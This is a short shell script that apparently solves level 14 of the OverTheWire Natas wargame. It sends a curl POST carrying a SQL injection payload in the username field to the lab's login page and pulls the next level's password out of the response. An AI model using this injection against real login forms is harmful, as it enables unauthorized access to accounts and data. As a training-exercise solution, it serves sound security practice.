#!/bin/echo Please source

export natas15pass=$(curl -s -X POST -d "password=123&username=john\" OR username!=\"john\"; #" -u natas14:$natas14pass natas14.natas.labs.overthewire.org/\?debug | grep 'The password for natas15 is ' | sed -rE 's/.*The password for natas15 is (.{32})<.*/\1/')
echo natas15: $natas15pass
